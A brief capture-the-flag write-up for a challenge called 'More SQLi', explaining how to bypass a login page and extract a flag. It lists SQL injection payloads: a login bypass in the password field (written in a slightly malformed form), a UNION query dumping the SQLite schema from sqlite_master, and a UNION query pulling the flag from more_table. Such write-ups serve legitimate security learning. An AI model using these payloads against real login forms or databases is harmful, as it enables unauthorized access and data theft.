# More SQLi

## Description
This write up will show how to solve the CTF for "More SQLi"

## Solution
It shows a login page. Giving a random user and a random password, it looks like the password is evaluated first and then the username.</br>
Try in the password field `' OR = 1=1;--` and give a random user.</br>
Using in the search field `UNION SELECT name, sql, null from sqlite_master;--` to get more info about the database.</br>
It shows that the `more_table` has a flag field.</br>
Now we know what table to query:</br>
`' UNION SELECT flag, null, null from more_table;--` and this will show the flag.
